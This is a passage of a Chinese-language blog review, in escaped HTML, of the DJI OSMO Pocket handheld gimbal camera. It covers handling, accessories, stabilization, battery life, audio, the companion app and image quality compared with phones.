1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]